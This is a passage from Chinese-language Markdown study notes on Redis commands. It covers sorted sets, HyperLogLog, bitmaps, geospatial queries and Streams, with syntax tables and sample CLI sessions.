|\n| SUNIONSTORE | SUNIONSTORE *destination* *key [key ...]* | 集合：并&存 | 取多个集合的并集并将结果集存储在一个集合中（destination） |\n| SSCAN | SSCAN *key* cursor [MATCH pattern] [COUNT count] | 遍历查 | 参考[SCAN](#Order_SCAN) |\n\n> 其他（6.0.6以下版本不支持）\n\n| 命令 | 使用 | 发行版本 | 功能 | 说明 |\n| :- | :- | :- | :- | :- |\n| SINTERCARD | SINTERCARD numkeys *key [key ...]* [LIMIT limit] | 7.0.0    | 集合：交 | 获取两个集合的交集数量<br />[LIMIT  limit]：最大交集量 <br />`SINTERCARD 2 testset testset1返回19` 两个集合的交集量容量为19 <br />`SINTERCARD 2 testset testset1 limit 10 `返回10 |\n| SMISMEMBER | SMISMEMBER *key* member [member ...]             | 6.2.0    | 查       | 返回每个成员是否是存储在 key  集合的成员（多个元素的存在的查询） <br />返回与指定的member顺序一致的数组 |\n\n# Zset : 有序集合\n\nRedis 排序集是由**相关分数**排序的唯一字符串（成员）的集合。当多个字符串具有相同的分数时，这些字符串按字典顺序排列。排序集的一些用例包括：\n\n- 排行榜。例如，您可以使用排序集轻松维护大型在线游戏中最高分的有序列表。\n\n- 速率限制器。特别是，您可以使用排序集来构建滑动窗口速率限制器，以防止过多的 API 请求。\n\n\nSorted Set 中的每个元素都与一个浮点值相关联，称为`score `。所以Sorted Set 也是一种Hash结构。\n\n\n\n排序规则：\n\n- 如果 A 和 B 是具有不同分数的两个元素， A.score > B.score，则 A > B 。\n\n- 如果 A 和 B 具有完全相同的分数，如果 A 字符串`在字典顺序上`大于 B 字符串，则 A > B。A 和 B 字符串不能相等，因为排序集只有唯一元素\n\n  \n\n实战场景\n\n- **排行榜**：小说视频等网站需要对用户上传的小说视频做排行榜，榜单可以按照用户关注数，更新时间，字数等打分，做排行。\n\n\n\n\n| 命令 | 使用 | 功能 | 说明 |\n| :- | :- | :- | :- |\n| ZADD | ZADD *key* [NX \\| XX] [GT \\| LT] [CH] [INCR]  *score member [score member   ...]* | 增 | 为有序集合添加一个/多个元素，若元素存在，则修改元素的score<br /> - **XX**:  只更新已经存在的元素。不添加新元素。<br />- **NX**:   只添加新元素。 不要更新已经存在的元素. <br />- **LT**:   如果新分数**小于**当前分数，则仅更新现有元素。 此标志不会阻止添加新元素。<br />- **GT**:  如果新分数**大于**当前分数，则仅更新现有元素。 此标志不会阻止添加新元素。<br />- **CH**:  通常ZADD的返回值只计算添加的新元素的数量，此命令将返回值则为更改的元素总数（CH 是 *changed* 的缩写），即：**添加的新元素**和**已经存在且分数被更新的元素**。  <br />**INCR**:   此命令类似于`ZINCRBY`。在此模式下只能指定一个分数元素对。<br /><br />注意: **GT**、**LT** 和 **NX** 选项是互斥的。 |\n| ZCARD | ZCARD *key* | 查 | 返回存储在 key 处的有序集合元素数 <br />card: cardinality 基数 |\n| ZCOUNT | ZCOUNT *key* min max | 查 | 用给定值内的分数计算有序集合元素数（包含min 和 max） |\n| ZINCRBY | ZINCRBY *key* increment member | 查&改 | 将存储在 key 的有序集合中的成员的分数按增量递增 <br />① 如果成员在排序集中不存在，则将其添加为增量作为其分数（就像它之前的分数是 0.0） <br />② 如果 key 不存在，则创建一个以指定成员为唯一成员的新排序集。 |\n| ZLEXCOUNT        | ZLEXCOUNT *key* min max                          | 查    | 该命令返回有序集合中指定字典范围内的元素个数。<br />① 当一个有序集合中的所有元素以相同的分数插入时，强制使用字典顺序<br />② min 和 max 的定义类似 [ZRANGEBYLEX](#ORDER_ZRANGEBYLEX) |\n| ZPOPMAX          | ZPOPMAX *key* [count]                          | 查&删 | `从一个key，弹出多个成员`<br />删除并返回存储在排序集（key）中得分最高的 count个成员。 |\n| BZPOPMAX         | BZPOPMAX *key [key ...]* timeout                 | 查&删 | ` 从多个key，弹出一个成员`<br />从一个或多个排序集（key [key ...]）删除并返回得分最高的成员<br />无数据，则阻塞等待，直到有一个key可用。 |\n| ZPOPMIN          | ZPOPMIN *key* [count]                          | 查&删 | `从一个key，弹出多个成员`<br />删除并返回存储在 key 的排序集中得分最低的 count个 成员 |\n| BZPOPMIN         | BZPOPMIN *key [key ...]* timeout                 | 查&删 | `从多个key，弹出一个成员`<br />从一个或多个排序集中删除并返回得分最低的成员，或阻止，直到有一个可用 |\n| ZRANGE           | ZRANGE *key* start stop [WITHSCORES]             | 查    | 有序集合，返回指定index范围的元素 <br />[WITHSCORES]：一并返回元素分值 <br />举例： `ZRANGE hackers 0 -1 WITHSCORES` |\n| ZRANK            | ZRANK *key* member                               | 查    | 返回 member 在存储在 key 的有序集合中的排名，分数从低到高排序。<br />排名（或索引）从 0 开始 |\n| ZREVRANK         | ZREVRANK *key* member                            | 查    | 返回 member 在存储在 key 的有序集合中的排名，分数从高到低排序。<br />排名（或索引）从 0 开始，这意味着得分最高的成员的排名为 0 |\n| ZREM             | ZREM *key* member [member ...]                   | 删    | 从存储在 key 的排序集中删除指定的成员<br />不存在的成员将被忽略 |\n| ZREMRANGEBYLEX   | ZREMRANGEBYLEX *key* min max                     | 删    | 删除给定字典序范围内的元素（闭区间）                         |\n| ZREMRANGEBYRANK  | ZREMRANGEBYRANK *key* start stop                 | 删    | 删除指定位置区间内的元素（闭区间）                           |\n| ZREMRANGEBYSCORE | ZREMRANGEBYSCORE *key* min max                   | 删    | 删除分数介于 min 和 max 之间的元素 （闭区间）                |\n| ZSCORE           | ZSCORE *key* member                              | 查    | 获取与排序集合中给定成员关联的分数                           |\n| ZSCAN            | ZSCAN *key* cursor [MATCH pattern] [COUNT count] | 查    | 增量迭代排序集元素和相关分数。使用方法可以参考[SCAN](#Order_SCAN) |\n\n> 集合操作（6.0.6 之前）\n\n| 命令                                                         | 功能 | 说明                                                         |\n| :----------------------------------------------------------- | ---- | :----------------------------------------------------------- |\n| **ZINTERSTORE** *destination* numkeys *key [key ...]* [**WEIGHTS** weight   [weight ...]] [**AGGREGATE** <**SUM** \\|**MIN** \\|**MAX**>] | 交集 | 计算多个有序集合的交集，并保存到destination 中。<br />[**WEIGHTS** weight   [weight ...]] ：使用此选项，可以为每个输入排序集指定一个乘法因子。<br />① 每个输入排序集中的每个元素的分数在传递给聚合函数之前都会乘以该因子。<br />② 当未给出 WEIGHTS 时，乘法因子默认为 1。<br />[**AGGREGATE** <**SUM** \\|**MIN** \\|**MAX**>] : *destination* 中元素的分数的计算方式。默认为求和。 |\n| **ZUNIONSTORE** *destination* numkeys *key [key ...]* [**WEIGHTS** weight   [weight ...]] [**AGGREGATE** <**SUM** \\|**MIN** \\|**MAX**>] | 并集 | 计算多个有序集合的并集，并保存到destination 中。<br />如果destination已经存在，它会被覆盖。<br /><br />[**WEIGHTS** weight   [weight ...]] ：使用此选项，可以为每个输入排序集指定一个乘法因子<br />① 每个输入排序集中的每个元素的分数在传递给聚合函数之前都会乘以该因子。<br />② 当未给出 WEIGHTS 时，乘法因子默认为 1。<br />[**AGGREGATE** <**SUM** \\|**MIN** \\|**MAX**>] : *destination* 中元素的分数的计算方式。默认为求和。 |\n\n> 集合操作（6.0.6 之后）\n\n| 命令                                                         | 功能 | 版本  | 说明                                                         |\n| :- | :- | :- | :- |\n| **ZINTER** numkeys *key [key ...]* [**WEIGHTS** weight [weight ...]]   [**AGGREGATE** <**SUM** \\|**MIN** \\|**MAX**>] [**WITHSCORES**] | 交集 | 6.2.0 | 计算多个有序集合的交集，并返回                               |\n| **ZUNION** numkeys *key [key ...]* [**WEIGHTS** weight [weight ...]]   [**AGGREGATE** <**SUM** \\|**MIN** \\|**MAX**>] [**WITHSCORES**] | 并集 | 6.2.0 | 计算多个有序集合的并集，并返回                               |\n| **ZDIFF** numkeys *key [key ...]* [**WITHSCORES**]             | 补集 | 6.2.0 | 计算第一个集合比后面所有集合多出的元素，并返回<br />（比较逻辑和分值无关） |\n| **ZDIFFSTORE** *destination* numkeys *key [key ...]*             | 补集 | 6.2.0 | 计算第一个集合比后面所有集合多出的元素，并存入destination<br />（比较逻辑和分值无关） |\n\n\n\n> 其他（6.0.6以下版本不支持）\n\n| 命令        | 使用                                                         | 发行版本 | 功能     | 说明                                                         |\n| :- | :- | :- | :- | :- |\n| ZRANDMEMBER | **ZRANDMEMBER** key [count [**WITHSCORES**]]                 | 6.2.0    | 查       | 从有序集合中返回一个或多个元素<br />如果提供的 count 参数为正，则返回不同元素的数组。数组的长度是计数或排序集的基数 (ZCARD)，以较低者为准。<br />如果以负数调用，则行为会发生变化，并且允许该命令多次返回相同的元素。在这种情况下，返回元素的数量是指定计数的绝对值。 |\n| ZRANGE      | **ZRANGE** *key* start  stop [**BYSCORE** \\|**BYLEX**] [**REV**] [**LIMIT** offset count]   [**WITHSCORES**] | 6.2.0    | 查       | 此命令可以替换以下命令：<br />**ZREVRANGE、ZRANGEBYSCORE、ZREVRANGEBYSCORE、ZRANGEBYLEX 和 ZREVRANGEBYLEX**<br /><br /> [**BYSCORE** \\|**BYLEX**] ：根据分值查找/ 根据字典顺序<br /><br />`zrange hackers  + - bylex rev`<br /> |\n| ZRANGESTORE | **ZRANGESTORE** *dst  src* min max   [**BYSCORE** \\| **BYLEX**]   [**REV**]   [**LIMIT** offset   count] | 6.2.0    | 查&存     | ZRANGE 查询结果结果存储在目标键dst 中                        |\n| ZMSCORE     | **ZMSCORE** *key* member [member ...]                        | 6.2.0    | 查       | 查询指定成员关联的分数<br />对于排序集中不存在的每个成员，返回一个 nil 值。 |\n| ZINTERCARD  | **ZINTERCARD** numkeys *key [key ...]* [**LIMIT** limit]     | 7.0.0    | 集合：交 | 返回交集元素总量<br /> [LIMIT limit]：默认为 0，表示无限制。<br />如果交集元素总量在计算过程中达到极限，算法将退出并将limit 作为交集总量<br />`ZINTERCARD 2 zset1 zset2 LIMIT 1`:   `返回 1` |\n| ZMPOP       | **ZMPOP** numkeys *key [key ...]* <**MIN \\| MAX**> [**COUNT** count] | 7.0.0    | 删       | `从多个key，弹出多个成员`<br />从提供的键名列表中的第一个非空排序集中弹出一个或多个成员 |\n| BZMPOP      | **BZMPOP** timeout numkeys *key [key ...]* <**MIN \\| MAX>** [**COUNT** count] | 7.0.0    | 删       | ` 从多个key，弹出多个成员`<br />有序集合中存在数据时返回，不存在时阻塞等待。<br />timeout：double数，时间单位为秒，设置为0时无期限等待 |\n\n> 6.2.0之后已被弃用，被合并到ZRANGE\n\n| 命令                                                         | 功能 | 说明                                                         |\n| :- | :- | :- |\n| **ZREVRANGE**  *key* start stop [**WITHSCORES**]             | 查   | 按照**分值降序**后，返回有序集合中指定**index**范围的元素    |\n| <span id=\"ORDER_ZRANGEBYLEX\">**ZRANGEBYLEX** *key* min max [**LIMIT** offset count]</span> | 查   | 该命令返回有序集合中指定**字典**范围内的元素<br />① 当排序集中的所有元素**以相同的分数**插入时，使用字典顺序，<br />② 此命令返回排序集中的所有元素在 key 处，其值介于 min 和 max 之间。<br />③ 如果排序集中的元素具有不同的分数，则返回的元素是未指定的<br />` ZRANGEBYLEX  hackers - +` <br />` ZRANGEBYLEX  hackers - + LIMIT 2 3`  <br />`ZRANGEBYLEX  hackers [A [Z`：包含<br />`ZRANGEBYLEX  hackers (A (Z`：不包含 |\n| **ZREVRANGEBYLEX** *key* max min [**LIMIT** offset count]    | 查   |                                                              |\n| **ZRANGEBYSCORE** *key* min max [**WITHSCORES**] [**LIMIT** offset count] | 查   | 按照**分值降序**后，返回有序集合中指定分值范围的元素<br />举例：`zrangebyscore hackers -inf 1950`<br />==-inf==: 表示负无穷 **infinity** [ɪnˈfɪnəti] |\n| **ZREVRANGEBYSCORE** *key* max min [**WITHSCORES**] [**LIMIT** offset count] | 查   |                                                              |\n\n\n\n# HyperLogLogs（基数统计）\n\n> Redis 2.8.9 版本更新了 Hyperloglog 数据结构\n\n- **什么是基数？**\n\n  举个例子，A = {1, 2, 3, 4, 5}， B = {3, 5, 6, 7, 9}；那么基数（不重复的元素）= 1, 2, 4, 6, 7, 9； （允许容错，即可以接受一定误差）\n\n- **HyperLogLogs 基数统计用来解决什么问题**？\n\n  这个结构可以非常省内存的去统计各种计数，比如注册 IP 数、每日访问 IP 数、页面实时UV、在线用户数，共同好友数等。\n\n- **它的优势体现在哪**？\n\n  一个大型的网站，每天 IP 比如有 100 万，粗算一个 IP 消耗 15 字节，那么 100 万个 IP 就是 15M。而 HyperLogLog 在 Redis 中每个键占用的内容都是 12K，理论存储近似接近 2^64 个值，不管存储的内容是什么，它一个基于基数估算的算法，只能比较准确的估算出基数，可以使用少量固定的内存去存储并识别集合中的唯一元素。而且这个估算的基数并不一定准确，是一个带有 0.81% 标准错误的近似值（对于可以接受一定容错的业务场景，比如IP数统计，UV等，是可以忽略不计的）\n\n- **相关命令使用**\n\n  ```sh\n  # PFADD key [element [element ...]]\n  > PFADD key1 a b c d e f g h i\t# 创建第一组元素\n  (integer) 1\n  \n  # 统计元素的基数数量\n  # PFCOUNT key [key ...]\n  > PFCOUNT key1\t\t\t\t\t\n  (integer) 9\n  \n  # 创建第二组元素\n  > PFADD key2 c j k l m e g a\t\t\n  (integer) 1\n  > PFCOUNT key2\n  (integer) 8\n  \n  # 合并两组：key1 key2 -> key3 并集\n  # PFMERGE destkey sourcekey [sourcekey ...]\n  > PFMERGE key3 key1 key2\t\t\t\n  OK\n  > pfcount key3\n  (integer) 13\n  ```\n\n  \n\n# Bitmap （位存储）\n\n> Bitmap 即位图数据结构，都是操作二进制位来进行记录，只有0 和 1 两个状态。\n\n \n\n- **用来解决什么问题**\n\n  比如：统计用户信息，活跃，不活跃； 登录，未登录；打卡，不打卡； **两个状态的，都可以使用 Bitmaps**！\n\n  如果存储一年的打卡状态需要多少内存呢？ 365 天 = 365 bit 1字节 = 8bit 46 个字节左右\n\n- **相关命令使用**\n\n  使用bitmap 来记录 周一到周日的打卡！ 周一：1 周二：0 周三：0 周四：1 ......\n\n  ```sh\n  # SETBIT key offset value\n  > setbit sign 0 1\n  (integer) 0\n  > setbit sign 1 1\n  (integer) 0\n  > setbit sign 2 0\n  (integer) 0\n  > setbit sign 3 1\n  (integer) 0\n  > setbit sign 4 0\n  (integer) 0\n  > setbit sign 5 0\n  (integer) 0\n  > setbit sign 6 1\n  (integer) 0\n  ```\n\n  查看某一天是否有打卡\n\n  ```sh\n  # GETBIT key offset\n  > getbit sign 3\n  (integer) 1\n  > getbit sign 5\n  (integer) 0\n  ```\n\n  统计操作，统计 打卡的天数\n\n  ```sh\n  # BITCOUNT key [start end [BYTE | BIT]]\n  # BITCOUNT 统计的是二进制后的数据\n  > bitcount sign # 统计这周的打卡记录，就可以看到是否有全勤！\n  (integer) 3\n  \n  \n  # 111001101001100010101111\n  > SET test 谳\n  OK\n  > BITCOUNT test\n  (integer) 12\n  ```\n\n1. GETBIT key offset\n\n2. SETBIT key offset value \n\n3. BITCOUNT key [start end [BYTE | BIT]]\n\n4. BITOP operation destkey key [key ...] ： 在多个键(包含字符串值)之间执行位操作，并将结果存储在目标键中\n\n   ```\n   BITOP AND destkey srckey1 srckey2 srckey3 ... srckeyN\n   BITOP OR destkey srckey1 srckey2 srckey3 ... srckeyN\n   BITOP XOR destkey srckey1 srckey2 srckey3 ... srckeyN\n   BITOP NOT destkey srckey\n   ```\n\n5. BITPOS key bit [start [end [BYTE | BIT]]]   返回字符串中第一个位设置为1或0的位置\n\n   \n\n# Geospatial (地理位置)\n\n\n\n> 这个功能可以推算地理位置的信息: 两地之间的距离, 方圆几里的人\n>\n> - 有效的经度从-180度到180度。\n> - 有效的纬度从-85.05112878度到85.05112878度。\n\n## GEOADD：添加地理位置\n\n**GEOADD** key [NX | XX] [CH] <font color=\"blue\">longitude latitude member </font> <font color=\"green\">[longitude\n  latitude member ...]</font>\n\n```bash\n> GEOADD china:city 118.76 32.04 nanjing 112.55 37.86 taiyuan 123.43 41.80 shenyang\n(integer) 3\n> GEOADD china:city 144.05 22.52 shengzhen 120.16 30.24 hangzhou 108.96 34.26 xian\n(integer) 3\n```\n\n**规则**\n\n两级无法直接添加，我们一般会下载城市数据(这个网址可以查询 GEO： http://www.jsons.cn/lngcode)！\n\n```bash\n# 当坐标位置超出上述指定范围时，该命令将会返回一个错误。\n> GEOADD china:city 39.90 116.40 beijin\n(error) ERR invalid longitude,latitude pair 39.900000,116.400000\n```\n\n![image-20230207154102639](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230207154102639-1678135967819-87.png) \n\n> 存储：将二维的经纬度转换为一维的HASH 值\n\n##  GEOPOS：获取指定的成员的经度和纬度\n\n获得当前定位, 一定是一个坐标值\n\n```bash\n> GEOPOS china:city taiyuan nanjing\n1) 1) \"112.54999905824661255\"\n   2) \"37.86000073876942196\"\n2) 1) \"118.75999957323074341\"\n   2) \"32.03999960287850968\"\n```\n\n\n\n##  GEODIST：计算两点之间的距离\n\n**GEODIST** key member1 member2  [M | KM | FT | MI]\n\n- m\n- km\n- mi 英里\n- ft 英尺\n\n```bash\n> GEODIST china:city taiyuan shenyang KM\n\"1026.4391\"\n\n# 位置不存在，返回为空\n> GEODIST china:city chengdou shenyang KM\n(nil)\n```\n\n##  GEOHASH： 该命令返回11个字符的HASH字符串\n\n```bash\n> GEOHASH china:city taiyuan shenyang\n1) \"ww8p3hhqmp0\"\n2) \"wxrvb9qyxk0\"\n```\n\n\n\n## GEOSEARCH：地理位置查询\n\n> 版本6.2.0 之后新增\n\n**GEOSEARCH** key <font color=\"blue\"><**FROMMEMBER** member | **FROMLONLAT** longitude latitude></font>\n  <font color=\"green\"><**BYRADIUS** radius <M | KM | FT | MI> | BYBOX width height <M | KM |\n  FT | MI>></font>  **[ASC | DESC]** <font color=\"blue\"> [**COUNT** count [**ANY**]]</font> [WITHCOORD] [**WITHDIST**]\n  [**WITHHASH**]\n\n```sh\n> GEOSEARCH china:city FROMMEMBER nanjing BYRADIUS 10000 KM \n1) \"nanjing\"\n2) \"taiyuan\"\n3) \"shenyang\"\n\n> GEOSEARCH china:city FROMMEMBER nanjing BYRADIUS 10000 KM WITHDIST\n1) 1) \"nanjing\"\n   2) \"0.0000\"\n2) 1) \"taiyuan\"\n   2) \"859.5256\"\n3) 1) \"shenyang\"\n   2) \"1161.7864\"\n   \n> GEOSEARCH china:city FROMMEMBER nanjing BYRADIUS 10000 KM WITHDIST WITHCOORD\n1) 1) \"nanjing\"\n   2) \"0.0000\"\n   3) 1) \"118.75999957323074341\"\n      2) \"32.03999960287850968\"\n2) 1) \"taiyuan\"\n   2) \"859.5256\"\n   3) 1) \"112.54999905824661255\"\n      2) \"37.86000073876942196\"\n3) 1) \"shenyang\"\n   2) \"1161.7864\"\n   3) 1) \"123.42999905347824097\"\n      2) \"41.79999919077864234\"\n```\n\n## GEOSEARCHSTORE\n\n**GEOSEARCHSTORE** destination source  <font color=\"blue\"><**FROMMEMBER** member | **FROMLONLAT** longitude latitude></font>\n  <font color=\"green\"><**BYRADIUS** radius <M | KM | FT | MI> | BYBOX width height <M | KM |\n  FT | MI>></font>  **[ASC | DESC]** <font color=\"blue\"> [**COUNT** count [**ANY**]]</font> [**STOREDIST**]\n\n此命令类似于`GEOSEARCH`，但将结果存储在目标键中。\n\n```sh\n> GEOSEARCHSTORE test china:city FROMMEMBER nanjing BYRADIUS 10000 KM\n(integer) 3\n```\n\n![image-20230207161213311](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230207161213311-1678135967819-89.png) \n\n\n\n\n\n##  GEORADIUS：获得所有附近的人的地址, 定位, 通过半径来查询（6.2.0之后弃用）\n\n> 从Redis版本6.2.0开始，此命令被认为已弃用。可将其替换为`GEOSEARCH`和`GEOSEARCHSTORE`，并使用`BYRADIUS`参数\n\n**GEORADIUS** key longitude latitude radius  **<M | KM | FT | MI>**\n  [**WITHCOORD**] [**WITHDIST**] [**WITHHASH**] [**COUNT** count [**ANY**]] [**ASC** | **DESC**]\n  [**STORE** key] [**STOREDIST** key]\n\n- **WITHDIST** : 返回距离\n- **WITHCOORD**：返回坐标\n- **WITHHASH**：返回坐标的HASH值（ZSET的SCORE值）\n- **COUNT** count：显示结果的数量\n\n```bash\n# 以 100,30 这个坐标为中心, 寻找半径为1000km的城市\n> GEORADIUS china:city 110 30 1000 km\t\t\t\n1) \"xian\"\n2) \"hangzhou\"\n3) \"nanjing\"\n4) \"taiyuan\"\n> GEORADIUS china:city 110 30 500 km\n1) \"xian\"\n> GEORADIUS china:city 110 30 500 km WITHDIST\n1) 1) \"xian\"\n   2) \"483.8340\"\n> GEORADIUS china:city 110 30 1000 km WITHCOORD WITHDIST count 2\n1) 1) \"xian\"\n   2) \"483.8340\"\n   3) 1) \"108.96000176668167114\"\n      2) \"34.25999964418929977\"\n2) 1) \"nanjing\"\n   2) \"864.9816\"\n   3) 1) \"118.75999957323074341\"\n      2) \"32.03999960287850968\"\n```\n\n##  GEORADIUSBYMEMBER： 显示与指定成员一定半径范围内的其他成员（6.2.0之后弃用）\n\n> 从Redis版本6.2.0开始，此命令被认为已弃用。 可将其替换为`GEOSEARCH`和`GEOSEARCHSTORE`，并使用`BYRADIUS`和`FROMMEMBER`参数\n\n**GEORADIUSBYMEMBER** key member radius **<M | KM | FT | MI>** [**WITHCOORD**]\n  [**WITHDIST**] [**WITHHASH**] [**COUNT** count [**ANY**]] [**ASC** | **DESC**] [**STORE** key]\n  [**STOREDIST** key]\n\n```bash\n> GEORADIUSBYMEMBER china:city taiyuan 1000 km\n1) \"nanjing\"\n2) \"taiyuan\"\n3) \"xian\"\n> GEORADIUSBYMEMBER china:city taiyuan 1000 km withcoord WITHDIST count 2\n1) 1) \"taiyuan\"\n   2) \"0.0000\"\n   3) 1) \"112.54999905824661255\"\n      2) \"37.86000073876942196\"\n2) 1) \"xian\"\n   2) \"514.2264\"\n   3) 1) \"108.96000176668167114\"\n      2) \"34.25999964418929977\"\n```\n\n\n\n\n\n\n\n\n\n\n\n# Redis Stream\n\nRedis Stream 是一种数据结构，其作用类似于`an append-only log`。您可以使用流实时记录和同步事件。 \n\nRedis Stream 用例的示例包括：\n\n- 事件溯源（例如，跟踪用户操作、点击等）\n- 传感器监控（例如，现场设备的读数）\n- 通知（例如，将每个用户的通知记录存储在单独的流中）\n\nRedis 为每个流条目生成一个唯一的 ID。您可以使用这些 ID 稍后检索其关联条目或读取和处理流中的所有后续条\n\n| 命令                                                     | 使用                                                         | 功能 | 说明                                                         |\n| :------------------------------------------------------- | ------------------------------------------------------------ | ---- | :----------------------------------------------------------- |\n| [XADD](#STREAM_XADD)                                     |                                                              | 增   | 唯一可以将数据添加到流的 Redis 命令                          |\n| [XRANGE](#STREAM_XRANGE)/ [XREVRANGE](#STREAM_XREVRANGE) |                                                              | 查   | 返回流中的一段元素                                           |\n| [XREAD](#STREAM_XREAD)                                   |                                                              | 查   | 从一个或多个流中读取数据，只返回 ID 大于调用者报告的最后接收到的 ID 的条目 |\n| [XTRIM](#STREAM_XTRIM)                                   | **XTRIM** *key* <MAXLEN \\|MINID> [= \\|~] threshold [LIMIT count] | 删   | 将流修剪到 (如果传入'~'，则大约) 某个大小                    |\n| XDEL                                                     | XDEL *key* id [id ...]                                       |      |                                                              |\n| [XINFO](#STREAM_XINFO)                                   | 1. **XINFO STREAM** key [FULL [COUNT count]]<br />2. **XINFO GROUPS** key<br />3. **XINFO CONSUMERS** key groupname <br /> | 查   |                                                              |\n| XLEN                                                     | XLEN key                                                     | 查   | 返回流中的条目数                                             |\n| XSETID                                                   | **XSETID** key last-id  [**ENTRIESADDED** entries_added]  [**MAXDELETEDID** max_deleted_entry_id] | 改   | XSETID 命令是一个内部命令。 Redis 主服务器使用它来复制最后交付的流 ID。 |\n|                                                          |                                                              |      |                                                              |\n\n\n\n 消息分组\n\n| 命令                                                   | 使用                                                         | 功能  | 说明                                                         |\n| :----------------------------------------------------- | ------------------------------------------------------------ | ----- | :----------------------------------------------------------- |\n| [XGROUP CREATE](#STREAM_XGROUP_CREATE)                 | **XGROUP CREATE** key groupname <font color=\"blue\"> <**id \\|\\$** > </font> <font color=\"green\">[**MKSTREAM**]</font> **[ENTRIESREAD entries_read]** | 增    | 创建消费者组                                                 |\n| [XGROUP CREATECONSUMER](#STREAM_XGROUP_CREATECONSUMER) | **XGROUP CREATECONSUMER** key groupname consumername         | 增    | 在消费者组中创建消费者                                       |\n| [XGROUP DELCONSUMER](#STREAM_XGROUP_DELCONSUMER)       | **XGROUP DELCONSUMER** key groupname consumername            | 删    | 删除消费者                                                   |\n| [XGROUP DESTROY](#STREAM_XGROUP_DESTROY)               | **XGROUP DESTROY** key groupname                             | 删    | 消费者组                                                     |\n| [XGROUP SETID](#STREAM_XGROUP_SETID)                   | **XGROUP SETID** key groupname <font color=\"blue\"> <**id \\|\\$** > </font> [ENTRIESREAD entries_read] | 改    | 修改消费者组的最后一个交付ID                                 |\n| [XREADGROUP](#STREAM_XREADGROUP)                       | **XREADGROUP** **GROUP** group consumer [**COUNT** count] <font color=\"blue\"> [**BLOCK** milliseconds]</font>  [**NOACK**] **STREAMS** key [key ...] <font color=\"orange\">id [id ...]</font> | 查/改 | 从消费者组返回新条目，或者访问给定消费者的待处理条目的历史记录 |\n| [XPENDING](#STREAM_XPENDING)                           | **XPENDING** key group [<font color=\"blue\">[IDLE min-idle-time] start end count [consumer]</font>] | 查    | 从消费者组`PEL`中 返回获取了但从未确认的消息信息和条目       |\n| [XCLAIM](#STREAM_XCLAIM)                               | **XCLAIM**  key group consumer  min-idle-time id [id ...] [**IDLE** ms]   [**TIME** unix-time-milliseconds] [**RETRYCOUNT** count] [**FORCE**] [**JUSTID**]   [**LASTID** id] |       | 更改(或获得)使用者组中消息的所有权，就像消息已交付给指定的使用者一样。 |\n| [XAUTOCLAIM](#STREAM_XAUTOCLAIM)                       |                                                              |       | 更改(或获取)使用者组中消息的所有权，就像将消息交付给指定的使用者一样。 |\n| [XACK](#STREAM_XACK)                                   | **XACK** key group id [id ...]                               |       | 将挂起的消息标记为正确处理，有效地将其从使用者组的挂起条目列表中删除。该命令的返回值是成功确认的消息的数量，也就是说，我们实际上能够在PEL中解析的id。 |\n\n\n\n##  <span id=\"STREAM_XADD\">XADD</span>\n\n- 命令详情\n\n  XADD key <font color=\"green\"> [**NOMKSTREAM**]</font> <font color=\"blue\"> [<**MAXLEN** | **MINID**> [= | ~] threshold [**LIMIT** *count*]] </font>  <font color=\"orange\"><* | id></font>  *field value [field value ...]*\n\n- 命令参数解释\n\n  1. 可以使用 `NOMKSTREAM `选项禁用 *Stream key* 的创建（key不存在时，返回null）\n\n  2. <font color=\"orange\"><* | id></font>  id组成方式：`<millisecondsTime>-<sequenceNumber>`\n\n     - 如果指定的 ID 参数是 `*`字符，XADD 命令将为您自动生成唯一 ID\n\n       `XADD stream:test:1 * ip 127.0.0.1`\n\n     - 虽然仅在极少数情况下有用，但可以指定格式良好的 ID，以便将使用指定的 ID 精确添加新条目。\n\n       `XADD stream:test:1 1662020231547-1 ip 127.0.0.2`\n\n       当用户为 指定显式 ID 时`XADD`，最小有效 ID 为 `0-1`，并且用户*必须*指定一个大于当前流内任何其他 ID 的 ID，否则该命令将失败并返回错误。\n\n       通常，仅当您有另一个系统生成唯一 ID（例如 SQL 表）并且您确实希望 Redis 流 ID 与另一个系统匹配时，才使用特定 ID。\n\n  3. <font color=\"blue\">[<**MAXLEN** | **MINID**> [= | ~] threshold\n     [**LIMIT** count]]</font>    封顶（Capped streams）\n\n     `MAXLEN`：使用 MAXLEN，当达到指定长度时，旧条目会被自动驱逐\n\n     `~`：表示封顶的阈值 count是一个近似值。`MAXLEN ~ 1000`我真的不需要这正好是 1000 个项目。它可以是 1000 或 1010 或 1030，只要确保至少保存 1000 个项目即可（常用场景）\n\n     `MINID`：驱逐 ID 低于阈值的条目，其中阈值是流 ID\n\n     ```sh\n     > XADD mystream 1526919030474-55 message \"Hello,\" \n     > XADD mystream 1526919030474-* message \" World!\"\n     > XADD mystream MAXLEN ~ 1000 * ... entry fields here ...\n     > XADD stest MINID = 1670928883730-0 * name zs age 12\n     ```\n\n- 版本变更\n\n  版本6.2.0 前：**XADD** key **ID** *field string [field string ...]*\n\n  版本6.2.0后 ：添加了 **NOMKSTREAM 、MINID、  LIMIT ** \n\n  版本7.0.0 ： 添加了对 显式 ID 形式的支持\n\n\n\n## <span id=\"STREAM_XRANGE\">XRANGE</span>\n\n- 详细命令\n\n  **XRANGE** key <font color=\"blue\">startId endId</font> <font color=\"orange\">[COUNT count]</font>\n\n- 命令参数解释\n\n  1. <font style=\"color:blue;font-weight:bold\">startId endId</font>:  startId 和 endId 之间为闭区间\n\n     - \\-和 + 特殊 ID 分别表示流中可能的最小 ID 和可能的最大 ID，因此以下命令将仅返回流中的所有条目：`XRANGE somestream - +`\n\n       `-`: 可以理解为：0-0\n\n       `+`: 可以理解为：18446744073709551615-18446744073709551615\n\n     - Incomplete IDs\n\n       不完整指定的ID：仅仅指定 UNIX 时间部分：`XRANGE somestream 1526985054069 1526985055069`\n\n       在这种情况下，XRANGE 将使用 -0 自动完成开始间隔，使用 -18446744073709551615 自动完成结束间隔，以便返回在给定毫秒和另一个指定毫秒结束之间生成的所有条目。\n\n       这也意味着**重复相同的毫秒两次，我们得到指定毫秒内的所有条目**\n\n       以这种方式使用 XRANGE 作为范围查询命令来获取指定时间内的条目。这对于获取一段时间内的操作历史，非常方便。\n\n     - Exclusive ranges\n\n       开区间范围查询：ID 前加上字符`(`来指定一个开区间：`XRANGE somestream (1526985685298-0 + COUNT 2`\n\n  2. <font color=\"orange\">[**COUNT** count]</font> : 返回结果的前count条entry\n\n- 使用场景介绍\n\n  1. stream 迭代\n\n     a. 上次查询的entry的id 用 开区间 `(`，作为下次查询的start 。\n\n     b. 我们可以从任何 ID 开始迭代（指定一个不完整的start id）\n\n     ```sh\n     > XRANGE writers - 